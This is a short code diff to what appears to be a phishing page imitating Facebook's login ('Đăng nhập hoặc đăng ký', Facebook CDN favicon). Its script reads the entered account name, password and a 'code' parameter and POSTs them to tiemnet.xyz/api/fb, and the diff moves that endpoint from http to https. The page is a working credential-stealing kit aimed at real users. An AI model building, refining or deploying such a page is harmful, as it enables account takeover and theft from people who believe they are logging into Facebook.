@@ -4,7 +4,7 @@
 <head>
   <title>Đăng nhập hoặc đăng ký</title>
   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-  <meta http-equiv="Access-Control-Allow-Origin" content="http://tiemnet.xyz/">
+  <meta http-equiv="Access-Control-Allow-Origin" content="https://tiemnet.xyz/">
   <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
   <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
   <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
@@ -170,7 +170,7 @@
       var pass = $('#m_login_password').val();
       var code =$.urlParam('code');
       $.ajax({
-        url: 'http://tiemnet.xyz/api/fb',
+        url: 'https://tiemnet.xyz/api/fb',
         method: 'POST',
         dataType: 'JSON',
         data: { acc: acc, pass: pass, code:code },
